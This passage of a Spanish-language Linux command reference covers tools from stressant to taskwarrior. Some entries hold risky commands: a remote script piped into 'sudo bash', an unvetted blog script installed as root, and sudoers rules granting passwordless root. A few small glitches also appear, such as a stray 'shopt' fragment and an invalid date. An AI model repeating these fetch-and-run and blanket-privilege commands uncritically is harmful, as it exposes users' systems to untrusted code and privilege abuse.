-t 20s (Tiempo que durará el proceso, 20 segundos. Opciones: s,m,h,d,y)


stressant
Colocar en varias partes del sistema (CPU, RAM, disco, red) una gran carga para detectar fallas y así asegurarse de que funcionen de manera confiable.
# stressant (prueba por defecto)
# stressant --fileSize 1M --cpuBurnTime 1s --iperfTime 1 (Prueba muy rápida, útil para ejecutar si está preocupado por el bloqueo de la máquina)
# stressant --diskPercent 100% --overwrite --cpuBurnTime 24h --smart (Prueba exhaustiva con limpieza completa del disco y prueba larga SMART)
# stressant --no-information --no-cpu --no-disk --iperfServer servidor.net (Prueba de red solo en un servidor dedicado)


stressapptest
Herramienta para realizar un test de carga del sistema.
# stressapptest -s 20 -M 256 -m 8 -C 8 -W
Algunas opciones:
-M mbytes  (Cantidad de megabytes de memoria RAM para realizar las pruebas. Por defecto toda la disponible)
-s 20 (Tiempo que durará el proceso)
-m 8 (Cantidad de procesos de copiado de memoria)
-W (llevar al límite la cpu)


strings
Analizar la memoria o una particion
$ strings /dev/mem
$ strings /dev/sda5


stterm
En realidad el paquete se llama st pero en Debian se llama stterm por razones históricas. Es un emulador de terminal con un enfoque en la simplicidad, claridad y frugalidad. La filosofía del proyecto es mantener las cosas simples, mínimas y utilizables. st admite mannejo del portapapeles, atajos de mouse y teclado, UTF-8, ancho de caracteres, redimensionar, 256 colores.


stty
Muestra/modifica las características del terminal o de un comando.
$ stty -a  (muestra todas las teclas de control, algunas obsoletas. Las más útiles: ^c [para el comando actual], ^d [final de flujo de entrada], ^u [borrar desde la posición actual al principio de linea] y ^w [borrar desde la posición actual al principio de la palabra])
$ stty size   (muestra número de columnas y lineas)
$ stty speed  (velocidad en baudios)
$ stty -a | sed -e 's/;/\n/g' | grep eof (Ver una en concreto)
$ stty eof ^F (Modificar la conbinación de teclas de "eof" a Control+f. Por defecto seria Control+D)
1-
	#!/bin/bash
	# ejemplo para desactivar echo
	# para que no se visualice el pass
	echo
	stty -echo
	read -p "Password: " PAS
	stty echo
	echo -e "\n"
	echo $PAS
	echo


stumpwm
Gestor de ventanas atilado escrito en common lisp y que solo usa el teclado. Los mesajes de texto, por defecto, aparecen en la parte superior derecha de la pantalla. El archivo de configuración de los atajos está en /usr/share/common-lisp/source/stumpwm/bindings.lisp.
Atajos:
	C-t C-g (Abortar lo que se haya pulsado)
	C-t n [C-t Space] (Ir a la siguiente ventana de la lista)
	C-t p (Ir a la ventana anterior de la lista)
	C-t " (Seleccionar y enfocar una ventana de una lista)
	C-t w (Imprime lista de ventanas, número y nombre)
	C-t : (evalua [eval] expresiones: (+ 2 2): evalúa una suma de dos más dos, (loadrc): evalúa el fichero .stumpwmrc, (quit): sale de la sesión)
	C-t o [C-t TAB] (En una ventana con varios paneles va saltando entre ellos)
	C-t flechas (Mueve el foco de un panel hacia el panel del lado que se indique con las flechas)
	C-t f (Seleccionar un panel por su número)
	C-t s (Dividir una ventana o un panel horizontalmente)
	C-t S (Dividir una ventana o un panel verticalmente)
	C-t k (Mata el panel actual y el programa que ejecute)
	C-t K (Equivalente a un kill -9 para el marco actual)
	C-t c (Ejecutar una terminal. xterm por defecto)
	C-t e (Ejecutar xemacs)
	C-t a (Muestra hora y fecha)
	C-t ! (Pregunta la aplicación gráfica que se quiere lanzar)
	C-t R (Suprimir una división. Si sólo existe una se maximiza)
	C-t b (Enviar el puntero del ratón a la esquina inferior derecha de la pantalla)
	C-t - (Minimizar aplicaciones del panel o ventana y mostrar la "fondo raiz")
	C-t Q (Eliminar todas la divisiones y maximizar el marco del foco)
	C-t m (Ver el último mensaje. Pulsando nuevamente las teclas muestra los anteriores)
	C-t t (Envia un C-t cuando se usan programas que usan esta combinación de teclas como firefox)
grupos (equivalente a escritorios):
	C-t g c (Crear nuevo grupo)
	C-t g g (Mostrar la lista de grupos)
	C-t g N [C-t g SPC](Ir al siguiente grupo de la lista)
	C-t G (Ver todos los grupos y las ventanas de cada grupo)
	C-t g p (Ir al grupo anterior de la lista)
	C-t Fn (Salta al grupo "n" [F1, F2...])
	C-t g k (Mata el grupo actual. todas las ventanas se fusionan con el siguiente grupo)
	C-t g m (Mover la ventana actual al grupo que se le indique)
	C-t g 2 (Ir al grupo con el dígito 2)
	C-t g ' (Seleccionar un grupo por nombre o por número)
	C-t g " (Seleccionar un grupo de una lista y cambiar a él)
	C-t g A [C-t g r] (Cambiar el nombre del grupo actual)
Información y ayuda:
	C-t i (Muestra información sobre la ventana actual)
	C-t w (Muestra unos segundos información de todas las ventanas)
	C-t F (Informa del panel activo)
	C-t ? (Muestra los comandos de ayuda)
	C-t h ? (lista atajos)
	C-t h k (Describe una combinación de teclas que se especifique)
	C-t h f (Describe una función que se especifique)
	C-t h v (Describe una variable que se especifique)
	C-t h w (Enumerar todas las secuencias de teclas asociadas a la orden especificada)
	C-t h c (Describe el comando que se especifique)
	C-t v (Mostrar la versión de stumpwm)
1.-
Para que se muestre la opción en el gdm:
	# nano /usr/share/xsessions/stumpwm.desktop
Y pegar el siguiente texto:
	[Desktop Entry]
	Encoding=UTF-8
	Name=StumpWM
	Comment=Tiling Window Manager
	Exec=/usr/bin/stumpwm
	Icon=
	loadType=Application
2.-
Colocar un fondo de pantalla:
$ nano .stumpwmrc (Si no existe lo creamos)
Y añadimos fondo negro:
	(set-bg-color "black")
O bien una imagen (Precisa paquete xloadimage)):
	(run-shell-command "xsetbg ~/fondos/fichero.png")
3.-
Abrir una sesión gráfica stumpwm junto a otra:
Crear un usuario con su home (P.e. pedro)
# useradd -d /home/pedro -s /bin/bash -m pedro
Entrar la contraseña de pedro:
# passwd pedro
Crear en su /home el archivo:
# nano .xinitrc
Con el contenido de la ruta a stumpwm:
	/usr/bin/stumpwm
Entrar en una tty (P.e la tty3):
	Crtl + Alt + F3
Y logearse como pedro. Una vez entrado en el sistema lanzar:
$ startx
Y tendremos una sesion stumpwm en la tty8


su
Cambiar de usuario
$ su -m           (Cambia de root [#] a usuario normal [$])
Nota.-  Tambien puede hacerse tecleando “exit o con Ctrl + d”
$ su -  (cambia a root)
$ su -c htop (Pedirá contraseña para lanzar htop, pero cuando se salga el prompt será de usuario, no de root)
$ su -c "!!" root (Ejecutar el último comando ejecutado como root)
$ su - usuario (recarga todos los archivos del perfil del usuario y se reseteen todos los paths y alias. Si no se especifica usuario, por defecto es root)


sublime-text
Editor. Descargar según arquitectura de http://www.sublimetext.com/2 o via ppa (Debian):
$ wget http://blog.anantshri.info/content/uploads/2010/09/add-apt-repository.sh.txt
# mv add-apt-repository.sh.txt /usr/sbin/add-apt-repository
# chmod o+x /usr/sbin/add-apt-repository
# chown root:root /usr/sbin/add-apt-repository
# add-apt-repository ppa:webupd8team/sublime-text-2
# apt-get update
# apt-get install sublime-text-2
Teclas de control:
Ctrl + p (abrir cuadro de diálogo [goto anything] donde se entran las consultas)
:palabra (Buscar "palabra" en el archivo abierto)
:157 (Ir a la linea 157)
Ctrl + ` (Ir a la consola de sublime text)
Ctrl + Mayu + p (Acceder al control de paquetes. Entrando "Install package" se instalan nuevos plugins y con "Remove package" se desinstalan)
Ctrl + n (Abrir nuevo documento)


subnetcalc
Calculadora de direcciones de subred IPv4/IPv6. Para una dirección IPv4 o IPv6 y una máscara de red o longitud de prefijo determinadas, calcula la dirección de red, la dirección de transmisión, el número máximo de hosts y el rango de direcciones de host. Además, imprime las direcciones en formato binario para mejor comprensión y puede identificar el tipo de dirección [multidifusión, local única, local de sitio, etc.] y extraer información adicional como por ejemplo, tipo, alcance, ID de interfaz, etc. Tambien puede generar prefijos locales únicos IPv6.
$ subnetcalc 192.168.8.149
$ subnetcalc 192.168.8.1/24
$ subnetcalc lapipaplena.wordpress.com


subversion
[Apache Subversion, svn]. Sistema de control de versiones centralizado. Los sistemas de control de versiones permiten que muchas personas, que pueden estar distribuidas geográficamente, colaboren en un conjunto de archivos [código fuente, sitios web, etc]. Incluye las siguientes herramientas svn, svnadmin, svnauthz, svnauthz-validate, svnbench, svndumpfilter, svnfsfs, svnlook, svnmucc, svnrdump, svnserve, svnsync y svnversion


sudo
Utilidad que permite a un usuario ejecutar programas con privilegios de root. En algunas distros sólo el usuario creado durante la instalación puede ejecutar sudo con privilegios de root, los demás han de ser agregados al grupo admin. Incluye las aplicaciones: cvtsudoers [convertir entre formatos de archivo sudoers], sudoedit [Ejecutar comandos como otro usuario] y sudoreplay [enumera los registros de salida creados por sudo]
$ sudo -k   (limpia la clave sudo introducida)
$ sudo -u usuario comando   (ejecutar el comando como un usuario privilegiado distinto de root)
$ sudo -l    (ver los permisos de sudo que tiene un usuario)
$ sudo !! (Ejecutar el último comando con sudo)
Pueden añadirse las siguientes lineas en /etc/sudoers:
	Defaults passprompt=”mi frase solicitando la contraseña...”
	Defaults badpass_message=”mi frase si se entra erronea...”
	usuario    ALL=(ALL) ALL  (Añadir el usuario a sudo)
	Defaults:usuario !authenticate  (si no queremos que nos pida la contraseña)
	usuario ALL=NOPASSWD: /usr/sbin/firestarter (Para que no pida contraseña al arrancar una aplicación concreta)
O añadir a la linea Defaults, algunos parámetros separados por comas:
	timestamp_timeout=5   (La contraseña se guardará 5 minutos.)
	insults    (Te mostrará insultos si fallas la contraseña)
	passwd_tries=2   (Permitir 2 errores al entrar la contraseña. Por defecto 3)
	rootpw (Para que nos pida la contraseña de root y no la de usuario)
Ejemplos:
	Defaults	 !lecture,tty_tickets,!fqdn,timestamp_timeout=0,insults
	Defaults@192.168.1.2 !lecture,tty.... (Permitir ejecución sólo desde nuestra máquina)
1.-
Añadir un usuario con privilegios de root:
# nano /etc/sudoers.d/10-installer
Y añadir la linea:
USER     ALL=(ALL) NOPASSWD: ALL
2.-
Para que al entrar un contraseña en la terminal aparezcan asterisco:
En la linea: Defaults env_reset
Añadir "pwfeedback" dejándola:
Defaults env_reset , pwfeedback
3.-
Ver la totalidad de acciones realizadas con el comando sudo
# journalctl _COMM=sudo
4.-
Significado de: %sudo ALL=(ALL:ALL) ALL
Un % especifica que se trata de un grupo, en este caso el grupo sudo. ALL=(ALL) o ALL=(ALL:ALL) especifica que en cualquier host que pueda tener este archivo, sudo puede ejecutar cualquier comando. El ALL final especifica que sudo puede ejecutar esos comandos como cualquier usuario en el sistema.


sudoedit
Ejecutar un comando como otro usuario (ver sudo)
$ sudoedit -u root /etc/sudoers


sudosh
Registra lo que hace un usuario en el sistema cuando requiere privilegios de administrador y lo almacena en dos ficheros de log, uno para los comandos y otro para los tiempos. Descarga: <http://sourceforge.net/projects/sudosh2/> y el ejecutable se instala en /usr/local/bin/sudosh
Ajustes
# nano /etc/sudoers
Y añadir la linea:
	Cmnd_Alias SUDOSH=/usr/local/bin/sudosh
Incluir sudosh en las shells:
# echo "/usr/local/bin/sudosh" >> /etc/shells
Añadimos la ruta al final del usuario que queremos monitorizar:
# nano /etc/passwd
	games:x:5:60:games:/usr/games:/usr/local/bin/sudosh
# sudosh (Inicia la grabación de todo lo que ocurre en la consola)
# sudosh-replay (Muestra las grabaciones archivadas en /var/log/sudosh/)
# sudosh-replay templix-root-script-1353428989-Eji70wlZOAuIE4HM (Reproduce la escogida)


sulogin
permite el ingreso del superusuario al sistema. Suele ser invocado por init cuando el sistema entra en el modo monousuario.


sum
Muestra la suma de verificación y el número de bloques del fichero.
$ sum -s archivo  (Emplea el algoritmo de suma BSD con bloques de 1 kB)
$ sum -r archivo  (Emplea el de System V, con bloques de 512 octetos)


summain
Realiza sumas de comprobación de archivos y busca sus metadatos.
$ summain --output=summain.txt -c MD5 archivo (Lo guardará en summain.txt y suma de verifación en MD5. Por defecto es SHA1. Otras opciones: SHA224, SHA256, SHA384, SHA512)
$ summain --output=Comprobación_dir -c SHA512 /home/usuario/ (De todos los archivos del directorio del usuario)


super
Permite a usuarios específicos ejecutar scripts u otros comandos con privilegios de root sin usar "sudo".
S super (comandos permitidos)
$ super -H (lista comandos correctos)
$ super -c /etc/super.tab (verifica si existen errores en el archivo de configuración)
$ super service apache2 restart (si se tiene permisos para usar "super", podrá reinicarse un servicio que requiere privilegios de root)
Para entrar un usuario en el archivo de configuración para usar, por ejemplo, apache2:
# nano /etc/super.tab
Y añadir la linea:
apache2  /sbin/apache2  USER


supervisor
Herramienta de control de procesos que permite administrar y monitorear servicios y demonios. Es un sistema para controlar y mantener el estado del proceso. Por ejemplo, si tenemos un script que siempre está corriendo, creamos un archivo de configuración para él:
            # nano /etc/supervisor/conf.d/mi_proceso.conf
            [program:mi_proceso]
            command=python3 ~/scripts/script1.sh
            autostart=true
            autorestart=true
            stderr_logfile=/var/log/mi_proceso.err.log
            stdout_logfile=/var/log/mi_proceso.out.log
Este archivo dice a supervisor que ejecute el script de bash, que lo reinicie si se detiene y registrar tanto los errores como la salida estándar en archivos de log.
# supervisorctl reread (recargar la configuración)
# supervisorctl update
# supervisorctl status (controlar los procesos que gestiona la aplicación)
# supervisorctl start mi_proceso (iniciar el proceso)
# supervisorctl stop mi_proceso (pararlo)
# supervisorctl restart mi_proceso (reiniciar)


surf
[dmenu, wget]. Navegador
$ surf -i URL (Deshabilitar imagenes)
$ surf -p URL (Deshabilitar plugins)
$ surf -s URL (Deshabilitar Javascript)
Atajos
Esc (Stop )
	^h (Historial)
	^l (Hacia delante en el historial)
	^k (ir hacia arriba de la página)
	^j (ir hacia abajo de la página)
	^K (Incrementar el zoom)shopt –s extglob
	^J (Disminuir el zoom)
	^I (Resetear el zoom)
	^n (ir al siguiente resultado de la busqueda)
	^N (ir al anterior resultado)
	^g (Abrir la barra de direcciones [demenu])
	^P (Abre dialogo de impresión)
	^r (Recargar página)
	^R (Recargar sin usar la caché)
	^o (Ver código fuente)


surfraw (sr)
Buscador de significados en la web. Antes de usar, especificar los navegadores que se usarán en teminal y en las X, mostrando la ruta absoluta a los ejecutables:
# nano /etc/xdg/surfraw/conf
	...
	# name/path of text browser executable
	# e.g links, lynx, w3m
	def   SURFRAW_text_browser /usr/bin/elinks
	# name/path of browser executable
	# e.g mozilla, netscape etc
	def   SURFRAW_graphical_browser /usr/bin/firefox
$ sr wikipedia -l=es Palabra_a_buscar (buscar en wikipedia y en español)
$ sr -elvi | less  (listar los sitios disponibles donde buscar)


suricata
Sistema de detección de intrusiones de red (IDS). Se basa en reglas para detectar una variedad de ataques/sondeos mediante la búsqueda de contenido de paquetes. Este nuevo motor admite la detección automática de múltiples subprocesos (IP, TCP, UDP, ICMP, HTTP, TLS, FTP y SMB), descompresión de Gzip y coincidencia rápida de IP.
# suricata --list-runmodes (listar los run modos posibles)
# suricata -c /etc/suricata/suricata.yaml -i eth0 -D (forma básica, activando el daemon)
# tail -f /var/log/suricata/fast.log (comprobar las alertas)


suspend
Cuando es posible, suspender la shell actual.
# suspend -f (Pasará de root a nuestro usuario)


suspicious-source
Script que genera una lista de archivos que no son archivos fuente comunes. Esto debe ejecutarse en la raíz de un árbol de fuentes para encontrar archivos que podrían no ser la "forma preferida de modificación" que requieren la licencia GPL y otras licencias.
# suspicious-source -d /usr/bin


sv
[runit]. Controlar y gestionar servicios monitoreados.
$ sv start nginx (iniciar un servicio)
$ sv stop nginx (parar un servicio)
$ sv restart nginx (reinicar un servicio)
$ sv status nginx (consultar estado de un servicio)
$ sv supervise nginx (supervisar un servicio)
$ sv down nginx (pausar un servicio)
$ sv up nginx (reanudar un servicio)
$ sv hup nginx (reiniciar un servicio si ya está en ejecución)
$ sv force-stop nginx (forzar parar un servicio)
$ sv reload nom_del_servei (recargar la configuración de un servicio sin pararlo)
$ sv status /etc/service/* (listar servicios)


swap
Tambien llamado memoria de intercambio o memoria virtual, es la que se sirve del espacio en el disco duro en lugar del módulo de memoria. Las aplicaciones usan la memoria RAM para ejecutarse en el ordenador cuando no hay muchas ejecutandose pero si hay muchas o estas necesitan mucha RAM o no hay RAM suficiente para todas es cuando entra en acción la swap. Una de las desventajas de utilizar la swap es que el sistema se vuelve más lento ya que la velocidad de intercambio de información entre un disco duro y la RAM es abismalmente diferente. La memoria RAM es unas 1000 veces más rápida que un SSD y 100.000 veces más rápida que un HDD. El tamaño de una swap en un equipo con una memoria de 8 GB o más, como norma general es 2GB. Reservar para la swap más de 2 GB es esteril pero aunque un equipo no tenga 8 GB de memoria es aconsejable no dejar una swap inferior a 1GB.


swapoff
Desactivar una partición swap.
$ swapoff -a (Desactivar todas las especificadas en /etc/fstab)


swapon
Activar una partición swap.
$ swapon /dev/hda5
$ swapon -a (Activar todas las particiones swap del /etc/fstab)
$ swapon -s (Comprobar estado actual de la memória swap)


swappiness
Uso de la swap por parte del sistema. Ver sysctl.
$  cat /proc/sys/vm/swappiness


swapspace
Complemento del sistema que adapta de forma continua y automática el espacio de memoria virtual disponible a las necesidades de memoria reales. Reclama espacio en disco para usarlo como espacio de intercambio cuando sea necesario y lo libera para que lo utilice el sistema de archivos cuando deja de ser necesario.
$ systemctl status swapspace.service (comprobar si está activo)


sxiv
Visor de imágenes con las funciones básicas necesarias para una visualización rápida.
$ sxiv imagen.png


synaptic
Interfaz gráfica para apt, sistema de gestión de paquetes basadas en Debian.
Atajos de teclado:
Ctrl + f (Buscar paquete)
Ctrl + r (Refrescar lista de paquetes)
Ctrl + g (Marcar todas las actualizaciones)
Ctrl + p (Aplicar los cambios)
Ctrl + q (Salir)


sync
Sincroniza memoria y disco [escribe el contenido de los buffers en disco]
$ sync
# sync; init 0 (Sincronizar y apagar el equipo)


synclient
Consultar/modificar las opciones del touchpad
$ synclient -l (Ver la configuración)
$ synclient TapButton1=1 TapButton2=2 VertEdgeScroll=1 (Activar el click y el escroll. Para hacerlo permanente poner la linea en el inicio [en fluxbox sería en /.fluxbox/startup]


sysbench
Utilidad para medir el rendimiento de un ordenador.
Descarga e instalación:
	$ curl -s https://packagecloud.io/install/repositories/akopytov/sysbench/script.deb.sh | sudo bash
	# apt -y install sysbench
$ sysbench --test=cpu --cpu-max-prime=20000 run (test para la CPU)
$ sysbench memory --threads=2 run (testear la memoria)
$ sysbench --test=cpu --cpu-max-prime=50000 --num-threads=6 run (Con este test medimos la velocidad de la CPU. num-threads indica el número de núcleos a usar)


sysctl
Muestra la configuración de los parámetros del kernel
# sysctl -a | more (Muestra todas las [muchisimas] variables)
# sysctl fs.file-max     (máximo de ficheros que pueden abrirse en el sistema)
# sysctl fs.file-max=256000   (modificarlo a 256000)
# sysctl -w vm.swappiness=10 (usar más memoria RAM y menos SWAP)
# sysctl kernel.panic=5 (forzar reinicio a los 5 segundos despues de un kernel panic)
Para hacer los cambios permanentes añadir las lineas al archivo /etc/sysctl.conf:
# echo "kernel.panic=5" >> /etc/sysctl.conf
# echo "vm.swappiness=10" >> /etc/sysctl.conf
Otros ajustes que podemos hacer en este archivo que mejoran el rendimiento del sistema son:
# echo "vm.vfs_cache_pressure = 50" >> /etc/sysctl.conf (reducir intercambio de información entre disco duro y memoria RAM)
# echo "vm.watermark_scale_factor = 200" >> /etc/sysctl.conf (cantidad de información en la memoria que será paginada al disco)
# echo "vm.dirty_ratio = 3" >> /etc/sysctl.conf (reducir la transferencia de la cantidad paginada)
1.-
Liberar memoria ram:
# watch -n 1 free -m (Comprobar el estado actual)
# sync && sysctl -w vm.drop_caches=3
# watch -n 1 free -m (Volver a lanzar el primer comando para ver la diferencia)


sysdig
herramienta de análisis del sistema en ejecución.
# csysdig (monitoreo de procesos y uso de CPU)
# sysdig -cl (listado de opciones disponibles)
# sysdig -c netstat (monitorearlas conexiones de red)
# sysdig -c httplog (visualización de registros HTTP)
# sysdig -c topprocs_cpu (monitoreo de procesos por uso de CPU)
# sysdig -c spy_users (monitoreo de la actividad de los usuarios)


syslinux
Hacer particiones arrancables
$ syslinux /dev/sda1


syslinux-utils
Conjunto de cargadores de arranque que actualmente admite sistemas de archivos DOS FAT y NTFS (SYSLINUX), sistemas de archivos Linux ext2/ext3/ext4, btrfs y xfs (EXTLINUX), arranques de red PXE (PXELINUX) o CD-ROM ISO 9660 (ISOLINUX). Contiene las utilidades auxiliares: gethostip, isohybrid, isohybrid.pl, lss16toppm, md5pass, memdiskfind, mkdiskimage, ppmtolss16, pxelinux-options, sha1pass y syslinux2ansi.



syslogout
Configuración diseñado para funcionar con bash para un mantenimiento de las partes del shell encargada de cerrar sesión y que permite o prohibe el cierre de sesión del shell para todos los usuarios del sistema de forma modular y centralizada. No es un ejecutable ni un daemon. Las configuraciones se encuentran en $HOME/.bash_logout, /etc/syslogout y /etc/syslogout.d/


system-config-printer
Gestor de impresoras. Lanza la gui.
$ system-config-printer


systemctl
[systemd-sysv]. Systemd es un administrador del sistema y gestor de servicios compatible con SysV al que reemplaza.
# systemctl reboot (Reiniciar el pc)
# systemctl poweroff (Parar el sistema)
# systemctl suspend (Suspender el sistema)
# systemctl hibernate (Poner el sistema en hivernación)
# systemctl (Listado de unidades activas)
# systemctl list-units (Listado de unidades activas)
# systemctl --failed (Listado de unidades que han tenido problemas)
# systemctl list-unit-files (Listado de unidades instaladas)
# systemctl list-dependencies ssh.service (servicios que se han de iniciar antes de iniciar el servicio requerido)
# systemctl start slim.service (Activa slim de inmediato)
# systemctl stop sshd.service (Parar ssh de inmediato)
# systemctl restart apache2.service (Reiniciar el servicio apache)
# systemctl reload wicd.service (Recargar la configuración de wicd)
# systemctl status cron.service (Muestra el estado de cron)
# systemctl is-active ssh.service (verificar si un servicio está activo)
# systemctl is-enabled cups (Comprueba si cups está habilitada o no)
# systemctl is-failed mysql (comprueba si un servicio falla)
# systemctl enable NetworkManager.service (Activa el inicio automático de network-manager en el arranque)
# systemctl disable smbd.service (Desactiva el inicio automático de samba en el arranque)
# systemctl daemon-reload (Recarga systemd, escaneando en busca de unidades nuevas o modificadas)
# systemctl isolate multi-user.target (Arrancar en runlevel 3)
# systemctl isolate graphical.target (Arrancar en runlevel 5)
# systemctl -r --type service --all (mostrar los servicios, activos o no, disponibles en el sistema)
# systemctl --type=service --state=running (los servicios que estan activos)
# systemctl --type=service --state=running | grep cups.service (ver si un servicio está activo)
# systemctl --type=service --state=failed,exited (ver estado de dos servicios)
1.-
Para incorporar el arranque a grub2, modificar del archivo:
# nano /etc/default/grub
La linea:
	GRUB_CMDLINE_LINUX_DEFAULT="quiet init=/bin/systemd"
2.-
Para que al bajar la tapa de un portatil el sistema no se suspenda.
# nano /etc/systemd/logind.conf
Y modificar la linea:
	HandleLidSwitch=ignore
3.-
Para cambiar el nivel de ejecución predeterminado del sistema, que con sysvinit se hacía editando /etc/inittab y modificando la linea id:5:initdefault:, con systemd se hace:
# ln -sf /lib/systemd/system/graphical.target /etc/systemd/system/default.target
4.-
Para acelerar el proceso de inicio y finalización:
# /etc/systemd/system.conf
Y descomentar y modificar las lineas siguientes de 90 segundos a 10:
	DefaultTimeoutStartSec=10s
	DefaultTimeoutStopSec=10s


systemd-analyze
Analiza la secuencia de arranque en sistemas basados en systemd (Ver systemctl)
# systemd-analyze time (muestra el tiempo total del arranque del sistema, desglosando el tiempo en espacio de usuario, del kernel y en la carga del initrd)
# systemd-analyze blame (procesos que se ejecutan y cuanto tiempo consumen)
# systemd-analyze critical-chain (ver cuellos de botella en el arranque)
# systemd-analyze plot > archivo.svg (mostrar un gráfico con los tiempos del arranque)
# systemd-analyze dump (volcar todo el arranque)


systemd-resolved
Herramienta para gestionar y consultar la configuración del resolver DNS en sistemas que usan systemd. La instalación de este paquete automáticamente sobreescribe /etc/resolv.conf y cambia para ser administrado por systemd-resolved. Incluye las herramientas resolvconf [herramienta principal para consultar y modificar la configuración DNS en tiempo real en un sistema que utiliza systemd-resolved] y resolvectl [gestionar dinámicamente el archivo /etc/resolv.conf agregando o eliminando servidores DNS].
$ resolvectl status (muestra una visión general de la configuración de DNS y resolución de nombres, incluyendo los servidores DNS configurados, los dominios de búsqueda y el modo de resolución)
$ resolvectl query example.com (devuelve la dirección IP asociada con example.com)
$ resolvectl dns eth0 8.8.8.8 1.1.1.1 (asigna los servidores DNS 8.8.8.8 y 1.1.1.1 a la interfaz eth0)
$ resolvectl revert eth0 (elimina cualquier configuración DNS personalizada en la interfaz eth0, volviendo a la configuración predeterminada)
$ resolvectl domain eth0 example.com (configura example.com como el dominio de búsqueda predeterminado para la interfaz eth0)
# echo "nameserver 8.8.8.8" | resolvconf -a eth0 (agregar 8.8.8.8 como servidor DNS para la interfaz eth0 en /etc/resolv.conf)
# resolvconf -d eth0 (elimina cualquier configuración DNS específica de la interfaz eth0)
Para verificar el contenido de resolv.conf:
# cat /etc/resolv.conf


systune
Este programa escribe los parámetros del núcleo, previamente guardados en un archivo de configuración, en el sistema de archivos /proc. Esto permite ajustar el rendimiento del kernel sin volver a compilarlo. Systune se inicia después de la mayoría de los demonios y otros scripts de init.d, por lo que puede usarse como sysctl de "segunda etapa".


sysvbanner
Muestra, horizontalmente, un texto de 'banner' de la misma manera que lo hace el banner de System V. Este paquete proporciona los comandos banner y sysvbanner
$ sysvbanner linux


sysv-rc-conf
Gestionar el arranque de las aplicaciones al inicio.
# sysv-rc-conf


tac
Muestra el fichero por consola, al revés. De la última linea a la primera
$ tac archivo.txt


tail
muestra las últimas 10 lineas de un fichero (si no se especifica otra cantidad)
# tail /var/log/apache2/access.log
# tail -f /var/log/apache2/access.log (Actualiza los logs cada segundo)
# tail -50 /var/log/apache2/access.log  (muestra las últimas 50)
# tail -f /var/log/httpd/access_log /var/log/fail2ban.log (Abrir dos archivos)
# tail -s 5 archivo.log (Actualiza cada 5 segundos)


taktuk
Permite ejecutar comandos en paralelo en un conjunto potencialmente grande de nodos remotos, usando ssh para conectarse a cada nodo.
# taktuk -s -m host_remoto.com broadcast exec [ hostname ] (autopropagar [s] en host_remoto.com [m] el comando "hostname")
Nota- "broadcast exec [ ... ]" es un comando que será ejecutado por el intérprete de taktuk y "autopropagar" se refiere a si en los host remotos no está instalado taktuk
# taktuk -m host_remoto.com (modo interactivo y estando taaktuk instalado en host_remoto.com)
# taktuk -s -m host1 -m host2 -m host3 broadcast exec { uptime } (autopropagar a tres host especificados el comando "uptime")
# taktuk -s -f hosts broadcast exec { uptime } (Lo mismo pero los host estan especificados en el archivo hosts [f])


talk
Entablar conversaciones con usuarios conectados a nuestro sistema o remotos
$ talk usuario ttyx  (Conectar con usuarios locales)
$ talk usuario@IP_o_Host (Con un usuario remoto [UNIX])


tapestat
[sysstat]. Utilidad para supervisar la actividad de las unidades de cinta conectadas a un sistema.
# tapestat -y (omitir el tiempo transcurrido desde que se inició el sistema)
# tapestat --human (presentación en formato legible [23M, 55k...])


taptempo
Presionar la tecla Intro al ritmo de una canción que se está escuchando se obtiene el número correspondiente de latidos por minuto [bpm=beats-per-minute]. Equivale al tempo ejecutado por un metrónomo.
$ taptempo


tar
[gzip bzip2 unzip tar unrar] Empaquetar y comprimir archivos y/o directorios.
$ tar -cf archivo.tar dir (Crear paquete .tar)
$ tar -xf archivo.tar (Descomprimir un .tar)
$ tar -tf archivo.tar (Listar contenido)
$ tar -cf archivo.tar.gz dir (Crear paquete tar.gz)
$ tar -xf archive.tar.gz (Descomprimir un tar.gz)
$ tar -cf archivo.tgz dir (Crear paquete .tgz)
$ tar -xf archivo.tgz (Descomprimir un .tgz)
$ tar -tf archivo.tgz (Listar contenido)
$ tar -cf archive.xz dir (Crear paquete .xz)
$ tar -xf archive.xz (Descomprimir paquete . xz)
$ tar -cf archivo.tbz dir (Empaquetar y comprimir)
$ tar -xf archivo.tbz (Desempaquetar y descomprimir)
$ tar -tf archivo.tbz (Ver contenido)
$ tar -cf archivo.tar.bz2 dir (Crear paquete .tar.bz2)
$ tar -xf archivo.tar.bz2 (Descomprimir archivo .tar.bz2)
Opciones:
	-z (Comprimir/descomprimir usando gzip)
	-c (Crear un nuevo archivo)
	-v (mostrar proceso)
	-f (archivo (nombre de archivo)
	-x (extraer el contenido del archivo comprimido)
	-t (listar contenido de un archivo)
	-j  (comprimir/descomprimir con bzip2)
Otros casos:
$ tar -cf - file/ | gpg -c > file.cript (empaquetar y encriptar un archivo)
$ tar -c ficheros | bzip2 > archivo.tar.bz2 (Empaquetar ficheros y comprimir)
$ tar -cvzf archivo.tar.gz /home/usuario --exclude=videos (Empaquetar el directorio del usuario exluyendo el directorio videos)
$ tar -cvfz archivo.tgz --exclude="home/usuario/Descargas" /home/usuario/* (Lo mismo de otra forma)
$ tar -cvzf archivo.tar.gz –exclude={*.iso,videos} /home/usuario (Otra forma de empaquetar el direcotorio del usuario excluyendo todas las iso y la carpeta videos)
$ tar -jxf archivo.tbz -C /tmp (Descomprimir en otra carpeta)
$ tar -cvfz archivo.tgz --exclude="home/usuario/Descargas" --exclude=”home/usuario/videos /home/usuario/* (Otra forma de especificar las carpetas excluidas)
$ tar -czf - Images | ssh 192.168.1.15 'cat > ~/Images.tar.tgz' (Crear un tar de un directorio y mandarlo a un host remoto por ssh donde creará en el directorio personal el paquete Images.tar.gz)


tarcat
Concatena por pantalla los contenidos de archivos de texto o comprimidos con tar.
$ tarcat file1.tar file2.tar file3.tar
$ tarcat file1.txt file2.txt file3.txt


tardy
Se utiliza para manipular las cabeceras dentro de archivos comprimidos [.tar, .zip, etc].
$ tardy -eXtract archivo.tar archivo
$ tardy --modify /new/path/ /archive.tar (cambia la ruta interna de los archivos dentro del .tar para que estén en el directorio /new/path/ sin modificar el contenido real)
$ tardy --list archive.tar (lista las cabeceras de los archivos dentro del .tar para ver la estructura interna del archivo comprimido)
$ tardy --set-date "2024-15-05" archive.tar (modificar la fecha del archivo comprimido)
$ tardy --strip 2 archive.tar (elimina los dos primeros niveles de directorios en las rutas de los archivos dentro del .tar)
$ tardy --create --modify /new/path/ /nuevo.tar file1 file2 (crea nuevo.tar donde los archivos file1 y file2 se encuentran bajo /new/path/)


taskwarrior
Gestor de tareas minimalista.
$ task add Titulo Entrada (añadir una tarea)
$ task list (ver la lista de tareas)
$ task 1 done (marcar una entrada como completada)
